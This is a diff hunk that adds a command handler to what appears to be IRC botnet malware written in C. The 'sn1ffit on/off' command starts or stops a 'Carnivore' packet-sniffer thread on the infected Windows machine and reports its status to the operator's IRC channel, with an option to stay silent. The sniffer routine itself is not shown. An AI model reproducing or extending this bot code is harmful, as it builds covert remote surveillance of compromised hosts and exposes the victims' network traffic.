@@ -1,0 +1,33 @@
+	#ifndef NO_SNIFFER
+         else if (strcmp("sn1ffit", a[s]) == 0) {
+            if (strcmp("on", a[s+1]) == 0) {
+               if (findthreadid(PSNIFF_THREAD) > 0)
+                  sprintf(sendbuf ,"[PSNIFF]: Already running.");
+               else {
+                  SNIFFER sniff;
+                  sniff.sock = sock;
+                  sniff.notice = notice;
+                  sniff.silent = silent;
+                  _snprintf(sniff.chan, sizeof(sniff.chan), ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))));
+
+                  sprintf(sendbuf, "[PSNIFF]: Carnivore packet sniffer active.");
+                  sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
+                  if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SnifferThread, (LPVOID)&sniff, 0, &id)) {
+                     while(sniff.gotinfo == FALSE)
+                        Sleep(50);
+                  } else
+                     sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
+               }
+            }
+            else if (strcmp("off", a[s+1]) == 0) {
+               if ((i=killthreadid(PSNIFF_THREAD)) > 0)
+                  sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
+               else
+                  sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
+            }
+            if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
+            addlog(sendbuf);
+
+            return 1;
+         }
+            #endif
